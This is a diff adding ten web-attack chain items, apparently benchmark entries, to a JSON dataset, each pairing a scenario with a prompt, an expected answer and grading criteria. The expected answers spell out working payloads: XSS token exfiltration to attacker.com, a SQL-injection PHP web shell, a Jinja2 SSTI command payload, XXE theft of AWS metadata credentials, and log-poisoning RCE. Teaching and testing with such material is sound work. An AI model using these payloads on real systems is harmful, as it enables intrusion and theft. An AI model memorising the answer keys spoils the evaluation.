@@ -3221,5 +3221,115 @@
     "impact_level": "High \u2013 Admin interface compromise",
     "category": "chain_scenarios",
     "evaluation_criteria": "Must explain DNS rebinding mechanics (initial resolution \u2192 rebind), identify how same-origin policy is bypassed, and describe the admin endpoint accessed."
+  },
+  {
+    "id": 294,
+    "scenario": "Image proxy service accepts arbitrary URLs, internal services not firewalled, internal HTTP endpoints expose RCE via debug parameters.",
+    "chain_steps": "URL validation bypass \u2192 SSRF to localhost:8080 \u2192 Debug endpoint RCE parameter",
+    "prompt": "Explain the SSRF-to-RCE chain in this proxy scenario.",
+    "expected_answer": "The attacker exploits insufficient URL validation by bypassing filters (e.g., encoding, double-encoding, IPv4 decimal notation) to make the proxy fetch from internal addresses. The proxy, running with internal network access, requests http://localhost:8080/admin/debug?cmd=whoami. The internal service, exposed on localhost, processes the cmd parameter unsafely via os.system() or exec(). By chaining SSRF past the validation layer with an internal RCE endpoint, the attacker achieves remote code execution without ever directly reaching the internal service. The critical gap: the proxy trusts its own network as inherently safe, failing to validate or sandbox the URLs it fetches.",
+    "reasoning_requirement": "Chain validation bypass with internal service exploitation.",
+    "impact_level": "Critical \u2013 Remote code execution on internal infrastructure",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain the URL bypass technique used to bypass the proxy's validation (e.g., encoding or IP format tricks); must identify how SSRF reaches the internal endpoint and why localhost/private IP is reachable; must trace the RCE parameter exploitation on the internal service."
+  },
+  {
+    "id": 295,
+    "scenario": "User profile page reflects unsanitized input in error messages; CSRF tokens stored in DOM without SameSite attribute; account transfer endpoint accepts POST without proper token validation.",
+    "chain_steps": "Reflected XSS injection \u2192 CSRF token exfiltration \u2192 Cross-origin transfer request \u2192 Account hijacking",
+    "prompt": "Explain the XSS-to-CSRF-to-account-takeover chain.",
+    "expected_answer": "The attacker crafts a malicious link containing an XSS payload that reflects in the profile error message: /?error=<img src=x onerror='fetch(\"https://attacker.com?token=\"+document.querySelector(\"input[name=csrf]\").value)'>. When the victim clicks, the payload executes in their browser, exfiltrating the CSRF token to the attacker's domain. With the token, the attacker can forge a valid POST request to /api/transfer with the victim's credentials, bypassing CSRF protection because the same-site cookie policy was never enforced. The attacker transfers funds from the victim's account to their own. The chain succeeds because XSS execution in the victim's context grants access to the CSRF token, and the transfer endpoint trusts tokens without validating origin.",
+    "reasoning_requirement": "Chain DOM-based XSS with CSRF token theft and state-changing action.",
+    "impact_level": "Critical \u2013 Account takeover and financial fraud",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must identify the XSS injection point and explain how the payload exfiltrates the CSRF token; must explain why the CSRF token is sufficient for the transfer request without additional validation; must trace the complete account takeover from token theft to unauthorized transfer."
+  },
+  {
+    "id": 296,
+    "scenario": "API endpoint /api/reports/{reportId}/download lacks authorization checks; report IDs are sequential; reports contain unredacted PII (SSN, credit card, home address).",
+    "chain_steps": "Sequential ID enumeration \u2192 IDOR access to arbitrary reports \u2192 Bulk PII extraction",
+    "prompt": "Explain the IDOR-to-PII-leak exploitation chain.",
+    "expected_answer": "The attacker observes that accessing /api/reports/123/download returns their own report with unredacted PII. They hypothesize that IDs are sequential and the endpoint lacks authorization. By iterating reportId from 1 to 10000, they request each report and receive unredacted personal data: names, social security numbers, credit card numbers, and home addresses. The server never validates that the requestor owns the report; it only checks authentication (is the user logged in) but not authorization (does the user own this resource). The attacker downloads reports in bulk using a simple loop, obtaining PII from thousands of users. This chain succeeds because sequential IDs are enumerable, authorization is missing, and PII is stored unencrypted and unredacted in the response.",
+    "reasoning_requirement": "Understand authorization vs. authentication and predictable ID patterns.",
+    "impact_level": "Critical \u2013 Mass PII disclosure and identity theft risk",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain the enumeration technique used to discover accessible report IDs; must identify the authorization check that is missing and why authentication alone is insufficient; must quantify the PII exposure and explain how bulk extraction is enabled by the lack of rate-limiting or access logging."
+  },
+  {
+    "id": 297,
+    "scenario": "Search functionality filters user input via simple blacklist; MySQL version supports INTO OUTFILE; web root writable; error messages leak table structure.",
+    "chain_steps": "SQLi bypass via encoding \u2192 INTO OUTFILE to webroot \u2192 PHP shell execution \u2192 RCE",
+    "prompt": "Explain the SQLi-to-file-write-to-RCE chain.",
+    "expected_answer": "The attacker identifies a SQL injection vulnerability in the search parameter: ?q=test' OR '1'='1. Simple filters block quotes, but the attacker uses hex encoding or character concatenation to bypass: ?q=test' OR char(49)=char(49) OR '1'='1. This executes: SELECT * FROM products WHERE name LIKE '%test' OR 1=1 OR '1'='1%'. Next, they craft a query that writes a PHP web shell to disk: test' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- . The MySQL server writes the PHP code to the web-accessible directory. The attacker then requests http://target.com/shell.php?cmd=whoami, executing arbitrary system commands. The chain succeeds because character encoding defeats the blacklist, INTO OUTFILE is enabled (a dangerous MySQL configuration), and the web directory is world-writable.",
+    "reasoning_requirement": "Chain SQL injection with file-write primitives and execution context.",
+    "impact_level": "Critical \u2013 Remote code execution via database",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain the SQL injection bypass technique (encoding, concatenation, or other filter evasion); must identify the INTO OUTFILE vector and the conditions required (file permissions, MySQL privileges); must explain how the written file becomes executable and accessible via HTTP."
+  },
+  {
+    "id": 298,
+    "scenario": "OAuth provider redirects user to client-specified URI without strict hostname validation; client does not validate redirect_uri parameter; tokens are appended to URL fragment.",
+    "chain_steps": "Open redirect in OAuth flow \u2192 Attacker-controlled redirect URL \u2192 Token leakage in referrer or logs",
+    "prompt": "Explain the open-redirect-to-OAuth-token-theft chain.",
+    "expected_answer": "The attacker registers a malicious application with the OAuth provider and crafts a link: https://oauth.provider.com/authorize?client_id=attacker&redirect_uri=https://victim-site.com/callback&redirect=https://attacker.com. The victim visits the attacker's link. After authorization, the OAuth provider redirects to https://victim-site.com/callback?redirect=https://attacker.com. If the callback endpoint naively follows the redirect parameter without validation, the victim is redirected to the attacker's domain with the authorization code in the URL: https://attacker.com?code=ABC123. Alternatively, if tokens are returned in the URL fragment (#), browser referrer leakage or browser history may expose tokens. The attacker extracts the authorization code, exchanges it for an access token via the OAuth provider's backend, and gains access to the victim's account. The chain succeeds because the OAuth provider doesn't strictly validate redirect URIs, and the client-side redirect logic is trusting.",
+    "reasoning_requirement": "Understand OAuth flow and redirect trust boundaries.",
+    "impact_level": "Critical \u2013 OAuth token theft and account hijacking",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must identify the open redirect vulnerability in the OAuth authorize endpoint or client callback; must explain how the redirect leads to token exposure (code interception or fragment leakage); must trace the token exchange to account access."
+  },
+  {
+    "id": 299,
+    "scenario": "File upload accepts .html files for template storage; uploaded templates are rendered server-side using Jinja2 with user context; no input sanitization in template content.",
+    "chain_steps": "SSTI payload in uploaded template \u2192 Server-side template rendering \u2192 Code execution in template context",
+    "prompt": "Explain the file-upload-to-SSTI-to-RCE chain.",
+    "expected_answer": "The attacker uploads a file named report_template.html containing Jinja2 template injection: {{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate() }}. This payload breaks out of the template context and executes system commands via Python's subprocess. The server stores this in the upload directory. When an administrator or system process renders templates using Jinja2 render_template_string() or render_template() on this file, the injection payload executes within the server process. The {{ }} syntax is evaluated as Jinja2 template code, not literal text. The __class__.__mro__[1].__subclasses__() sequence traverses Python's object model to access dangerous classes like subprocess.Popen. The attacker achieves RCE by exploiting the template engine's evaluation of untrusted template input. This chain succeeds because upload validation checks only file extension (not content), and templates are rendered without sandboxing.",
+    "reasoning_requirement": "Understand SSTI and template engine capabilities.",
+    "impact_level": "Critical \u2013 Remote code execution via template injection",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain the SSTI payload and how Jinja2 evaluates the malicious template syntax; must identify where the template is rendered (which endpoint or process triggers template evaluation); must explain how the payload breaks out of the template context to access Python internals."
+  },
+  {
+    "id": 300,
+    "scenario": "XML parser processes user input without XXE protection; SSRF is possible to internal services; internal EC2 instance can reach AWS metadata endpoint at 169.254.169.254:80.",
+    "chain_steps": "XXE entity expansion \u2192 External entity resolves to SSRF \u2192 AWS metadata endpoint access \u2192 Credential theft",
+    "prompt": "Explain the XXE-to-SSRF-to-AWS-metadata chain.",
+    "expected_answer": "The attacker submits an XML document: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">]><data>&xxe;</data>. The XML parser processes the DOCTYPE declaration and resolves the external entity by making an HTTP request to the AWS metadata endpoint. The response, containing IAM role names, is embedded in the XML output and returned to the attacker. The attacker then crafts a second XXE request to retrieve credentials: <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role-Name\">. The metadata endpoint responds with AccessKeyId, SecretAccessKey, and SessionToken. The attacker now has temporary AWS credentials for the EC2 instance's IAM role. This chain succeeds because the XML parser is misconfigured to allow external entity resolution, the instance has network access to the metadata service, and the metadata service has no IP-based or header-based access controls.",
+    "reasoning_requirement": "Chain XXE with SSRF and cloud metadata exploitation.",
+    "impact_level": "Critical \u2013 AWS credentials and infrastructure compromise",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain the XXE DOCTYPE declaration and how external entities trigger HTTP requests; must identify the SSRF chain to the metadata endpoint (169.254.169.254); must explain how credential extraction from metadata leads to infrastructure compromise."
+  },
+  {
+    "id": 301,
+    "scenario": "JavaScript application merges user-supplied JSON into global configuration object without property whitelist; merge function recursively copies all properties including prototype keys.",
+    "chain_steps": "Prototype pollution via JSON merge \u2192 Global object poisoning \u2192 XSS payload in template rendering",
+    "prompt": "Explain the prototype-pollution-to-XSS chain.",
+    "expected_answer": "The attacker sends a request with payload: {\"__proto__\": {\"isAdmin\": true, \"template\": \"<img src=x onerror='alert(\\\"XSS\\\")>\"}}\". The application deserializes this JSON and merges it into the global config object using Object.assign(config, userInput) or a similar recursive merge without property filtering. When the merge encounters __proto__, it modifies Object.prototype itself, not the config object. All objects subsequently created inherit isAdmin: true and the template payload. Later, when the application renders a template (e.g., document.innerHTML = configTemplate), the polluted prototype property is evaluated, executing the XSS payload in the DOM. Users viewing the site trigger the injected XSS. The chain succeeds because prototype pollution modifies the shared prototype chain, poisoning all objects downstream, and the template rendering engine doesn't sanitize inherited properties.",
+    "reasoning_requirement": "Understand prototype pollution and inherited property evaluation in rendering contexts.",
+    "impact_level": "High \u2013 Persistent XSS via global object pollution",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain the __proto__ key and how recursive merge leads to prototype modification; must identify how the polluted property is inherited by downstream objects; must explain why the XSS payload executes in the template rendering context."
+  },
+  {
+    "id": 302,
+    "scenario": "Local file inclusion vulnerability in log viewer; access logs include unsanitized user-agent; logs are parseable as PHP code; application includes logs during error handling.",
+    "chain_steps": "Malicious User-Agent injection \u2192 LFI to access.log \u2192 Log poisoning with PHP code \u2192 Code execution via log inclusion",
+    "prompt": "Explain the LFI-to-log-poisoning-to-RCE chain.",
+    "expected_answer": "The attacker crafts an HTTP request with a malicious User-Agent: User-Agent: <?php system($_GET['c']); ?>. The web server logs this User-Agent to /var/log/apache2/access.log without sanitization. The attacker then exploits an LFI vulnerability in the log viewer: GET /logs.php?file=../../../var/log/apache2/access.log. The application includes the log file using include() or require(). PHP interprets the poisoned log entry and executes the embedded PHP code. The attacker now has a PHP shell accessible via: GET /logs.php?file=../../../var/log/apache2/access.log&c=whoami. The arbitrary commands execute in the web server process context. This chain succeeds because access logs are writable by the attacker via HTTP requests, the LFI vulnerability allows arbitrary file inclusion, the application uses include() on untrusted file paths, and PHP evaluates embedded code in log files.",
+    "reasoning_requirement": "Chain LFI with log poisoning and PHP evaluation.",
+    "impact_level": "Critical \u2013 Remote code execution via log file inclusion",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain how the User-Agent injection poisons the log file with executable PHP; must identify the LFI vulnerability and how the attacker includes the poisoned log file; must explain why PHP code in logs is evaluated and how arbitrary commands are executed."
+  },
+  {
+    "id": 303,
+    "scenario": "CORS policy allows credentials from subdomain origins; JavaScript Fetch API automatically includes cookies; sensitive endpoint lacks CSRF protection; subdomain takeover possible via DNS.",
+    "chain_steps": "CORS wildcard subdomain \u2192 Credential-bearing fetch request \u2192 Unauthorized state-changing action \u2192 Session hijacking",
+    "prompt": "Explain the CORS-misconfiguration-to-session-theft chain.",
+    "expected_answer": "The attacker compromises or registers a subdomain (e.g., attacker.vulnerable-site.com) via DNS misconfiguration or unclaimed subdomain registration. The vulnerable site's CORS policy is: Access-Control-Allow-Origin: *.vulnerable-site.com and Access-Control-Allow-Credentials: true. The attacker hosts a malicious page on attacker.vulnerable-site.com that makes a fetch request to the sensitive endpoint: fetch('https://api.vulnerable-site.com/api/changeEmail', {method: 'POST', credentials: 'include', body: JSON.stringify({email: 'attacker@evil.com'})}). Because CORS allows the origin and credentials are included, the victim's cookies are automatically sent with the request. The sensitive endpoint lacks CSRF protection, trusting only CORS to validate requests. The endpoint processes the request and changes the victim's email to the attacker's address. The attacker then resets the account password and gains full account access. This chain succeeds because CORS overly-trusts subdomain origins, the API endpoint accepts state-changing requests with credentials, and CSRF protection is missing.",
+    "reasoning_requirement": "Chain CORS misconfiguration with missing CSRF protection.",
+    "impact_level": "Critical \u2013 Account takeover via cross-origin request",
+    "category": "chain_scenarios",
+    "evaluation_criteria": "Must explain how the CORS wildcard policy allows the attacker's subdomain origin; must identify that credentials are automatically included by fetch and why CORS trusts this origin; must trace the unauthorized state-change (email change) and how it leads to account compromise."
   }
 ]
